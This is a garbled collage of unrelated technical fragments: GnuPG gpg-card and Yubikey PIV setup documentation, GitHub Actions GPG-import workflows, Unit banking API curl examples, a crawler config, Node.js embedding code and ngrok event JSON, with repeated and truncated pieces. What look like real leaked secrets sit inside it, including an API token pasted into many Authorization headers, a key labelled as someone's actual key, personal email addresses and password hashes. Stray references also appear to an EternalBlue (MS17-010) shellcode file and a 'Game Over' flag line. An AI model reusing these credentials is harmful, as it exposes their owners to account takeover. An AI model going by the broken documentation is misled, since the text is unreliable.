LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] NAME [--clear] PRIVATEDO [--clear] n [< file] file READCERT [--openpgp] certref > file ¶ Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3". URL [--clear] gpg's. --fetch WRITECERT certref < file ¶ WRITECERT --openpgp certref [< file|fpr] WRITECERT --clear certref --openpgp file fpr. WRITEKEY [--force] keyref keygrip ¶ Write a private key object identified by keygrip to the card under the id keyref. CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶ Serial number A hex-string with the serial number of the card.

Type This gives the type of the card’s application. For example "OpenPGP" or "PIV".

Keygrip A hex-string identifying a key.

Keyref The application slot where the key is stored on the card. For example "OpenPGP.1"

Status The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card.

YUBIKEY cmd args Various commands pertaining to Yubikey tokens with cmd being:

LIST List supported and enabled Yubikey applications.

ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] DISABLE Enable or disable the specified or all applications on the given interface.

The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit.

GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are:

Authentication key This is a 24 byte key described by the hex string 010203040506070801020304050607080102030405060708.

PIV Application PIN This is the string 123456.

PIN Unblocking Key This is the string 12345678. list (the string gpg/card> card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: D2760001240102010006090746250000 Application type .: OpenPGP Version ..........: 2.1 [...] on: push: tags: - "v*"

permissions: contents: write

jobs: release: runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 - uses: cli/gh-extension-precompile@v1 with: go_version: "1.16" Then

uses: cli/gh-extension-precompile@v1 env: CGO_ENABLED: 1
uses: cli/gh-extension-precompile@v1 with: build_script_override: "script/build.sh" name: release
on: push: tags: - "v*"

permissions: contents: write

jobs: release: runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 - id: import_gpg uses: crazy-max/ghaction-import-gpg@v5 with: gpg_private_key: {{ secrets.GPG_PASSPHRASE }} - uses: cli/gh-extension-precompile@v1 with: gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }}

macOS

gpg --armor --export-secret-key joe@foo.bar | pbcopy

Ubuntu (assuming GNU base64)

gpg --armor --export-secret-key joe@foo.bar -w0 | xclip

Arch

gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i

FreeBSD (assuming BSD base64)

gpg --armor --export-secret-key joe@foo.bar | xclip

name: import-gpg

on: push: branches: master

jobs: import-gpg: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v4 - name: Import GPG key uses: crazy-max/ghaction-import-gpg@v6 with: gpg_private_key: {{ secrets.PASSPHRASE }} - name: List keys run: gpg -K name: import-gpg

on: push: branches: master

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB gpg/card> writecert PIV.9D < encr.crt

jobs: import-gpg: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v4 - name: Import GPG key uses: crazy-max/ghaction-import-gpg@v6 with: gpg_private_key: {{ secrets.PASSPHRASE }} fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8" - name: List keys run: gpg -K

pub ed25519 2021-09-24 [C] 87F257B89CE462100BEC0FFE6071D218380FDCC8 Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092 uid [ unknown] Joe Bar joe@bar.foo sub ed25519 2021-09-24 [S] C17D11ADF199F12A30A0910F1F80449BE0B08CB8 Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB name: import-gpg /.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add

application-priority piv to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens.

With one of these methods employed the list command of gpg-card shows this:

gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: [none] keyref .....: PIV.9A Card authenticat. : [none] keyref .....: PIV.9E Digital signature : [none] keyref .....: PIV.9C Key management ...: [none] keyref .....: PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB.key list --cards well. The PIV authentication key (internal reference PIV.9A Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption

gpg/card> auth 010203040506070801020304050607080102030405060708 gpg/card> auth < myauth.key

gpg/card> generate --algo=nistp384 PIV.9A PIV card no. yk-9074625 detected gpg/card> generate --algo=nistp256 PIV.9E PIV card no. yk-9074625 detected gpg/card> generate --algo=rsa2048 PIV.9C PIV card no. yk-9074625 detected ‘--force’ gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 Key management ...: [none] keyref .....: PIV.9D keygrip gpg self-signed X.509 certificate (exit the gpg-card tool, first):

$ gpgsm --gen-key -o encr.crt (1) RSA (2) Existing key (3) Existing key from card Your selection? 1 What keysize do you want? (3072) 2048 Requested keysize is 2048 bits Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 3 Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

otto@example.net
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) y These parameters are used: Key-Type: RSA Key-Length: 2048 Key-Usage: encrypt Serial: random Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB gpgsm: certificate created Ready. $ gpgsm --import encr.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1 gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 Key management ...: [none] keyref .....: PIV.9D keygrip gpgsm --gen-key -o encr.crt (1) RSA (2) Existing key (3) Existing key from card Your selection? 1 What keysize do you want? (3072) 2048 Requested keysize is 2048 bits Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 3 Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

6309304695z@gmail.com
MS17-010

000006

'options file' Reads configuration from file instead of from the default per-user configuration file. The default configuration file is named scdaemon.conf and expected in the .gnupg directory

'--homedir dir' 'dir.' environment variable GNUPGHOME or (on Windows systems) by means of the Registry entry 'HKCU\Software\GNU\GnuPG:HomeDir.' --verbose gpgsm, such as ‘-vv’.

--debug flags --debug-allow-core-dump no-detach multi-server --log-file file pcsc-driver library ¶ Use library to access the smartcard reader. The current default on Unix is libpcsclite.so --reader-port number_or_string 32768 echo scd getinfo reader_list
| gpg-connect-agent --decode | awk '/^D/ {print
Extra close brace or missing open brace

$2}'
--deny-admin
--application-priority namelist
gpg-connect-agent 'scd getinfo app_list' /bye
--auto-expand-secme
--ssh-fingerprint-digest
--max-cache-ttl
1
MARKTRUSTED fingerprint "P"|"S"
+The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:
+
+GPG_TTY=$
(tty) +export GPG_TTY +--daemon [command line] +server + +gpg-card +AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶ +AUTH +FETCH +GENERATE [--force] [--algo=algo{+algo2}] keyref +KDF-SETUP ¶ +Prepare the OpenPGP card KDF feature for this card. (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3" --homedir + +GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are: + +Authentication key +This is a 24 byte key described by the hex string +010203040506070801020304050607080102030405060708.

Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) y These parameters are used: Key-Type: RSA Key-Length: 2048 Key-Usage: encrypt Serial: random Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB gpgsm: certificate created Ready. $ gpgsm --import encr.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB gpg/card> writecert PIV.9D < encr.crt

gpgsm --with-keygrip -k 6309304695z@gmail.com Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB keyref .....: PIV.9D (encr) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Encryption key for yk-9074625,O=example,C=DE user id ..: 6309304695z@gmail.com

34798AAFE0A7565088101CC4AE31C5C8C74461CB.key

$ gpgsm --learn $ gpgsm --gen-key -o sign.crt Please select what kind of key you want: (1) RSA (2) Existing key (3) Existing key from card Your selection? 3 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 Your selection? 3 Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 2 Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

6309304695z@gmail.com
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) These parameters are used: Key-Type: card:PIV.9C Key-Length: 1024 Key-Usage: sign Serial: random Name-DN: CN=Signing key for yk-9074625,O=example,C=DE Name-Email: 6309304695z@gmail.com

Proceed with creation? (y/N) y Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED gpgsm: certificate created Ready. $ gpgsm --import sign.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

‘gpgsm --learn’ Digital signature’ key gpg-card:010203040506070801020304050607080102030405060708

shellcode/eternalblue_sc_merge.py

gpg/card> writecert PIV.9C < sign.crt on: push: branches: master

jobs: import-gpg: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v4 - name: Import GPG key uses: crazy-max/ghaction-import-gpg@v6 with: gpg_private_key: {{ secrets.PASSPHRASE }} trust_level: 5

global.h -- global header file

md2.h -- header file for MD2

md2c.c -- source code for MD2 aladdin:$apr1$ZjTqBB3f$IF9gdYAGlMrs2fuINjHsz. user2:$apr1$O04r.y2H$/vEkesPhVInBByJUkXitA/

artifact_paths = ["{repo}/design"]

exclude_artifact_paths = []

code_paths = [ "/artifact-app/src", "/artifact-app/tests", "/artifact-lib/src", "/artifact-ser/src", "/artifact-data/src", "/artifact-test/src", "/artifact-frontend/src", ]

exclude_code_paths = [ ]

code_url = "https://github.com/vitiral/artifact/blob/master/{file}#L{line}"

[export] md_header = """ Artifact design docs, exported to markdown.

See REQ-purpose for the top level artifact.

Note: Export docs like this with art export md exported.md

Settings are in .art/settings.toml """ md_family = { type = "list" }
[export.md_dot] type = "ignore"

pre = """

Alt text



custom_mark10

"""

post = """

custom_mark10


"""

startUrls: ["https://www.algolia.com/blog/"], pathsToMatch: ["https://www.algolia.com/blog/"], recordExtractor: ({ url,
Unable to render expression.

$, contentLength, fileType }) =&gt; {
return [{ url: url.href, title: $
('head > title').text() }]; } ‘--force’ new Crawler({ appId: "000006", apiKey: "ATATT3xFfGF0em-7Sy8fZXMVgrISVS9LAQikknXg7B0GyB-S-vVVTBM37VJoVWyYpdetDBLd1X0SdJk2FH0EorccPwryJm3xsPYum01tZK_yc0_rbXvKV_U__JgGuERBBhZDH-gOpsv4GvsIaTOb74PfUj9JtqBXWlxO_GeQ84aq04QHt54XByw=155E8069", indexPrefix: "crawler_", rateLimit: 8, maxUrls: 500, startUrls: ["https://www.algolia.com/blog"], ignoreQueryParams: ["utm_medium", "utm_source", "utm_campaign", "utm_term"], actions: [ { indexName: "default_index_name", pathsToMatch: ["https://www.algolia.com/blog/"], recordExtractor: ({ url, $, contentLength, fileType }) => { console.log(Crawling "${url.href}");

    return [
      {
        // URL
        url: url.href,
        hostname: url.hostname,
        path: url.pathname,
        depth: url.pathname.split("/").length - 1,

        // Metadata
        contentLength,
        fileType,
        title: $("head > title").text(),
        keywords: $("meta[name=keywords]").attr("content"),
        description: $("meta[name=description]").attr("content"),
        type: $('meta[property="og:type"]').attr("content"),
        image: $('meta[property="og:image"]').attr("content"),

        // Content
        headers: $("h1,h2")
          .map((i, e) => $(e).text())
          .get()
      }
    ]
  }
}
], initialIndexSettings: { default_index_name: { searchableAttributes: [ "unordered(keywords)", "unordered(title)", "unordered(description)", "unordered(headers)", "url" ], customRanking: ["asc(depth)"], attributesForFaceting: ["fileType", "type"] } } });

// check compatibility if (!("BarcodeDetector" in globalThis)) { console.log("Barcode Detector is not supported by this browser."); } else { console.log("Barcode Detector supported!");

// create new detector const barcodeDetector = new BarcodeDetector({ formats: ["code_39", "codabar", "ean_13"], }); } // check supported types BarcodeDetector.getSupportedFormats().then((supportedFormats) => { supportedFormats.forEach((format) => console.log(format)); }); barcodeDetector .detect(imageEl) .then((barcodes) => { barcodes.forEach((barcode) => console.log(barcode.rawValue)); }) .catch((err) => { console.log(err); }); Git Credential Manager = We have their Flag = Game Over. curl -X GET 'https://api.s.unit.sh/cards/41?include=customer,account' -H "Authorization: Bearer ${ATATT3xFfGF0em-7Sy8fZXMVgrISVS9LAQikknXg7B0GyB-S-vVVTBM37VJoVWyYpdetDBLd1X0SdJk2FH0EorccPwryJm3xsPYum01tZK_yc0_rbXvKV_U__JgGuERBBhZDH-gOpsv4GvsIaTOb74PfUj9JtqBXWlxO_GeQ84aq04QHt54XByw=155E8069}" { "type": "depositAccount", "id": "50", "attributes": { // ... }, "relationships": { // relationships object "customer": { // relationship object "data": { // resource linkage with single resource identifier "type": "businessCustomer", "id": "39" } } } }

curl -X DELETE 'https://api.s.unit.sh/users/2/api-tokens/22' -H "Authorization: Bearer ${ATATT3xFfGF0em-7Sy8fZXMVgrISVS9LAQikknXg7B0GyB-S-vVVTBM37VJoVWyYpdetDBLd1X0SdJk2FH0EorccPwryJm3xsPYum01tZK_yc0_rbXvKV_U__JgGuERBBhZDH-gOpsv4GvsIaTOb74PfUj9JtqBXWlxO_GeQ84aq04QHt54XByw=155E8069}"

{ "data": { "id": "20", "type": "apiToken", "attributes": { "createdAt": "2021-07-01T09:04:50.987Z", "description": "Production token", "expiration": "2022-07-01T13:47:17.000Z", "token": "v2.public.eyJyb2xlIjoib3JnI..." } } } ‘--force’ curl -X POST 'https://api.s.unit.sh/users/2/api-tokens' -H 'Content-Type: application/vnd.api+json' -H 'Authorization: Bearer ${ATATT3xFfGF0em-7Sy8fZXMVgrISVS9LAQikknXg7B0GyB-S-vVVTBM37VJoVWyYpdetDBLd1X0SdJk2FH0EorccPwryJm3xsPYum01tZK_yc0_rbXvKV_U__JgGuERBBhZDH-gOpsv4GvsIaTOb74PfUj9JtqBXWlxO_GeQ84aq04QHt54XByw=155E8069}' --data-raw '{ "data": { "type": "apiToken", "attributes": { "description": "Production token", "scope": "customers applications", "expiration": "2022-07-01T13:47:17.000Z" } } }' { "data": [ { "id": "21", "type": "apiToken", "attributes": { "createdAt": "2021-07-01T09:13:23.211Z", "description": "Production token", "expiration": "2022-07-01T09:13:23.124Z" } }, { "id": "22", "type": "apiToken", "attributes": { "createdAt": "2021-07-01T09:14:10.590Z", "description": "Testing token", "expiration": "2021-07-01T13:47:17.000Z", "sourceIp": "192.168.1.1,192.168.1.2" } } ] } curl -X GET 'https://api.s.unit.sh/users/2/api-tokens' -H "Authorization: Bearer ${ATATT3xFfGF0em-7Sy8fZXMVgrISVS9LAQikknXg7B0GyB-S-vVVTBM37VJoVWyYpdetDBLd1X0SdJk2FH0EorccPwryJm3xsPYum01tZK_yc0_rbXvKV_U__JgGuERBBhZDH-gOpsv4GvsIaTOb74PfUj9JtqBXWlxO_GeQ84aq04QHt54XByw=155E8069}" { "data": { "id": "19", "type": "apiToken", "attributes": { "createdAt": "2021-07-01T08:51:09.108Z", "description": "Production token", "expiration": "2022-07-01T13:47:17.000Z", "token": "v2.public.eyJyb2xlIjoib3JnI..." } } }

curl -X GET 'https://api.s.unit.sh/cards/41?include=customer,account' -H "Authorization: Bearer ${ATATT3xFfGF0em-7Sy8fZXMVgrISVS9LAQikknXg7B0GyB-S-vVVTBM37VJoVWyYpdetDBLd1X0SdJk2FH0EorccPwryJm3xsPYum01tZK_yc0_rbXvKV_U__JgGuERBBhZDH-gOpsv4GvsIaTOb74PfUj9JtqBXWlxO_GeQ84aq04QHt54XByw=155E8069}"

{ "type": "depositAccount", "id": "50", "attributes": { // ... }, "relationships": { // relationships object "customer": { // relationship object "data": { // resource linkage with single resource identifier "type": "businessCustomer", "id": "39" } } } } curl -X GET 'https://api.s.unit.sh/cards' -H "Authorization: Bearer ${i8FWKLBjXEg3TdeK93G3K9PKLzhbT6CRhn/VKkTsm....}" curl -X POST 'https://api.s.unit.sh/cards' -H "Content-Type: application/vnd.api+json" -H "Authorization: Bearer ${i8FWKLBjXEg3TdeK93G3K9PKLzhbT6CRhn/VKkTsm....}" --data-raw '{ "data":{ "type":"individualDebitCard", "attributes": { "shippingAddress": { "street": "5230 Newell Rd", "city": "Palo Alto", "state": "CA", "postalCode": "94303", "country": "US" } }, "relationships": { "account": { "data": { "type": "depositAccount", "id": "10001" } } } } } '

curl -X POST 'https://api.s.unit.sh/customers/8/token' -H 'Content-Type: application/vnd.api+json' -H 'Authorization: Bearer ${ATATT3xFfGF0em-7Sy8fZXMVgrISVS9LAQikknXg7B0GyB-S-vVVTBM37VJoVWyYpdetDBLd1X0SdJk2FH0EorccPwryJm3xsPYum01tZK_yc0_rbXvKV_U__JgGuERBBhZDH-gOpsv4GvsIaTOb74PfUj9JtqBXWlxO_GeQ84aq04QHt54XByw=155E8069}' --data-raw '{ "data": { "type": "customerToken", "attributes": { "scope": "customers accounts-write accounts", "jwtToken": "i8FW..." } } }' { "data": { "type": "customerTokenVerification", "attributes": { "verificationToken": "i8FWKLBjXEg3TdeK93G3K9PKLzhbT6CRhn/VKkTsm...." } } } curl -X POST 'https://api.s.unit.sh/customers/10001/token/verification' -H 'Content-Type: application/vnd.api+json' -H 'Authorization: Bearer ${ATATT3xFfGF0em-7Sy8fZXMVgrISVS9LAQikknXg7B0GyB-S-vVVTBM37VJoVWyYpdetDBLd1X0SdJk2FH0EorccPwryJm3xsPYum01tZK_yc0_rbXvKV_U__JgGuERBBhZDH-gOpsv4GvsIaTOb74PfUj9JtqBXWlxO_GeQ84aq04QHt54XByw=155E8069}' --data-raw '{ "data": { "type": "customerTokenVerification", "attributes": { "channel": "sms" } } }'

curl -X GET 'https://api.s.unit.sh/users/2/api-tokens' -H "Authorization: Bearer ${ATATT3xFfGF0em-7Sy8fZXMVgrISVS9LAQikknXg7B0GyB-S-vVVTBM37VJoVWyYpdetDBLd1X0SdJk2FH0EorccPwryJm3xsPYum01tZK_yc0_rbXvKV_U__JgGuERBBhZDH-gOpsv4GvsIaTOb74PfUj9JtqBXWlxO_GeQ84aq04QHt54XByw=155E8069}" curl -X DELETE 'https://api.s.unit.sh/users/2/api-tokens/22' -H "Authorization: Bearer ${ATATT3xFfGF0em-7Sy8fZXMVgrISVS9LAQikknXg7B0GyB-S-vVVTBM37VJoVWyYpdetDBLd1X0SdJk2FH0EorccPwryJm3xsPYum01tZK_yc0_rbXvKV_U__JgGuERBBhZDH-gOpsv4GvsIaTOb74PfUj9JtqBXWlxO_GeQ84aq04QHt54XByw=155E8069}" { "data": [ { "id": "21", "type": "apiToken", "attributes": { "createdAt": "2021-07-01T09:13:23.211Z", "description": "Production token", "expiration": "2022-07-01T09:13:23.124Z" } }, { "id": "22", "type": "apiToken", "attributes": { "createdAt": "2021-07-01T09:14:10.590Z", "description": "Testing token", "expiration": "2021-07-01T13:47:17.000Z", "sourceIp": "192.168.1.1,192.168.1.2" } } ] } curl -X POST 'https://api.s.unit.sh/users/2/api-tokens' -H 'Content-Type: application/vnd.api+json' -H 'Authorization: Bearer ${ATATT3xFfGF0em-7Sy8fZXMVgrISVS9LAQikknXg7B0GyB-S-vVVTBM37VJoVWyYpdetDBLd1X0SdJk2FH0EorccPwryJm3xsPYum01tZK_yc0_rbXvKV_U__JgGuERBBhZDH-gOpsv4GvsIaTOb74PfUj9JtqBXWlxO_GeQ84aq04QHt54XByw=155E8069}' --data-raw '{ "data": { "type": "apiToken", "attributes": { "description": "Production token", "scope": "customers applications", "expiration": "2022-07-01T13:47:17.000Z" } } }' { "data": { "id": "19", "type": "apiToken", "attributes": { "createdAt": "2021-07-01T08:51:09.108Z", "description": "Production token", "expiration": "2022-07-01T13:47:17.000Z", "token": "v2.public.eyJyb2xlIjoib3JnI..." } } } { "version": 1, "type": "doc", "content": [ { "type": "paragraph", "content": [ { "type": "text", "text": "Hello " }, { "type": "text", "text": "world", "marks": [ { "type": "strong" } ] } ] } ] } { "version": 1, "type": "doc", "content": [] }

                         Apache License
                   Version 2.0, January 2004
                http://www.apache.org/licenses/
artifact_paths = ["{repo}/design"]

exclude_artifact_paths = []

code_paths = [ "/artifact-app/src", "/artifact-app/tests", "/artifact-lib/src", "/artifact-ser/src", "/artifact-data/src", "/artifact-test/src", "/artifact-frontend/src", ] ‘--force’ exclude_code_paths = [ ]

code_url = "https://github.com/vitiral/artifact/blob/master/{file}#L{line}"

[export] md_header = """ Artifact design docs, exported to markdown.

See REQ-purpose for the top level artifact.

Note: Export docs like this with art export md exported.md

Settings are in .art/settings.toml """ md_family = { type = "list" }
[export.md_dot] type = "ignore"

pre = """

Alt text



custom_mark10

"""

post = """

custom_mark10


"""

artifact_py lint artifact_py export -i --format md @pip install artifact_py artifact_py --help Or download the standalone zip file from releases and run within your build system

unzip artifact_py-0.1.2.zip artifact_py-0.1.2/artifact_py/bin/artifact_py --help Writing your design doc An artifact design doc is just a regular design doc which is parsed for artifacts. An artifact is a linkable design piece. It is linkable to other artifacts and linkable to code. ‘--force’ You specify an artifact like so:

This is an artifact (SPC-my_artifact) {#SPC-my_artifact}

Or alternatively (in github)

This is an artifact (SPC-my_artifact)

@ -1,3 +1,15 @@ 56 npm install tree-sitter-cli ReadMe.md int main(int argc, char** argv) { argv = uv_setup_args(argc, argv); std::vectorstd::string args(argv, argv + argc); // Parse Node.js CLI options, and print any errors that have occurred while // trying to parse them. std::unique_ptrnode::InitializationResult result = node::InitializeOncePerProcess(args, { node::ProcessInitializationFlags::kNoInitializeV8, node::ProcessInitializationFlags::kNoInitializeNodeV8Platform });

for (const std::string& error : result->errors()) fprintf(stderr, "%s: %s\n", args[0].c_str(), error.c_str()); if (result->early_return() != 0) { return result->exit_code(); }

// Create a v8::Platform instance. MultiIsolatePlatform::Create() is a way // to create a v8::Platform instance that Node.js can use when creating // Worker threads. When no MultiIsolatePlatform instance is present, // Worker threads are disabled. std::unique_ptr platform = MultiIsolatePlatform::Create(4); V8::InitializePlatform(platform.get()); V8::Initialize();

// See below for the contents of this function. int ret = RunNodeInstance( platform.get(), result->args(), result->exec_args());

V8::Dispose(); V8::DisposePlatform();

node::TearDownOncePerProcess(); return ret; }int RunNodeInstance(MultiIsolatePlatform* platform, const std::vectorstd::string& args, const std::vectorstd::string& exec_args) { int exit_code = 0;

// Setup up a libuv event loop, v8::Isolate, and Node.js Environment. std::vectorstd::string errors; std::unique_ptr setup = CommonEnvironmentSetup::Create(platform, &errors, args, exec_args); if (!setup) { for (const std::string& err : errors) fprintf(stderr, "%s: %s\n", args[0].c_str(), err.c_str()); return 1; }

Isolate* isolate = setup->isolate(); Environment* env = setup->env();

{ Locker locker(isolate); Isolate::Scope isolate_scope(isolate); HandleScope handle_scope(isolate); // The v8::Context needs to be entered when node::CreateEnvironment() and // node::LoadEnvironment() are being called. Context::Scope context_scope(setup->context());

// Set up the Node.js instance for execution, and run code inside of it.
// There is also a variant that takes a callback and provides it with
// the `require` and `process` objects, so that it can manually compile
// and run scripts as needed.
// The `require` function inside this script does *not* access the file
// system, and can only load built-in Node.js modules.
// `module.createRequire()` is being used to create one that is able to
// load files from the disk, and uses the standard CommonJS file loader
// instead of the internal-only `require` function.
MaybeLocal<Value> loadenv_ret = node::LoadEnvironment(
    env,
    "const publicRequire ="
    "  require('node:module').createRequire(process.cwd() + '/');"
    "globalThis.require = publicRequire;"
    "require('node:vm').runInThisContext(process.argv[1]);");

if (loadenv_ret.IsEmpty())  // There has been a JS exception.
  return 1;

exit_code = node::SpinEventLoop(env).FromMaybe(1);

// node::Stop() can be used to explicitly stop the event loop and keep
// further JavaScript from running. It can be called from any thread,
// and will act like worker.terminate() if called from another thread.
node::Stop(env);
}

return exit_code; }const path = require('node:path'); path

path.win32.basename('C:\temp\myfile.html'); // Returns: 'myfile.html' path.posix.basename('/tmp/myfile.html'); // Returns: 'myfile.html' .basename('C:\temp\myfile.html'); // Returns: 'C:\temp\myfile.html' path.basename('C:\temp\myfile.html'); // Returns: 'myfile.html' @@ -4178,6 +4178,31 @@ grateful345i@gmail.com --header --header '2b0kkNvjIBFuBl15nGxtnMd5B3P_37bwJDJ2GYRMTicczqhEG' api key bot Grateful's actual '2b0kkNvjIBFuBl15nGxtnMd5B3P_37bwJDJ2GYRMTicczqhEG' api key bot Grateful's actual #000006 $ Breadcrumbs X 4 ### ++ Sigma 9 ++ org.xwiki.rendering xwiki-rendering-macro-ctsreport 16.0.0 org.xwiki.rendering xwiki-rendering-legacy-transformations 16.0.0 4.0.0 org.xwiki.rendering xwiki-rendering-legacy 16.0.0 xwiki-rendering-legacy-transformations XWiki Rendering - Legacy - Transformations - Parent POM pom XWiki Rendering - Legacy - Transformations - Parent POM xwiki-rendering-legacy-transformation-macro 4.0.0 org.xwiki.rendering xwiki-rendering-macros 16.0.0 xwiki-rendering-macro-ctsreport XWiki Rendering - Macro - CTS Report Parses unit test results produced by Jenkins to generate test data for display 0.71 Compatibility Test Suite Report Macro org.xwiki.commons xwiki-commons-text ${commons.version} org.xwiki.commons xwiki-commons-context ${commons.version} org.xwiki.commons xwiki-commons-script ${commons.version} org.xwiki.rendering xwiki-rendering-syntax-plain ${project.version} ev.conn.server_name.matches("ngrok-docs-examples.ngrok.dev") ev.conn.server_name.matches(".*-your-org.ngrok.dev") && ev.conn.server_port == 80 ev.conn.client_ip != "2601:0:8200:0:4cd7:fd52:0:7823" && ev.conn.server_name == "ngrok-docs-examples.ngrok.dev" { "event_id": "ev_25X2AsJ5xpvuOParTYUQWe12XKo", "event_type": "ip_policy_created.v0", "event_timestamp": "2022-02-23T23:29:29Z", "account_id": "ac_2OtNvAlhso10Gx6s7eupzX3F98q", "principal": { "id": "usr_2OtNv9qH5Nk4NuNeszZ39gBxZ4H", "subject": "foo@example.com", "source": "API", "credential": { "id": "ak_2Oxt94wYsBTLwFUoMZcJRvJTaub", "uri": "https://api.ngrok.com/api_keys/ak_2Oxt94wYsBTLwFUoMZcJRvJTaub" } }, "object": { "id": "ipp_25X2Ao39z73FlVQKZ1iReMPe6Qv", "uri": "https://api.ngrok.com/ip_policies/ipp_25X2Ao39z73FlVQKZ1iReMPe6Qv", "created_at": "2022-02-23T23:29:29Z", "description": "Home network IP", 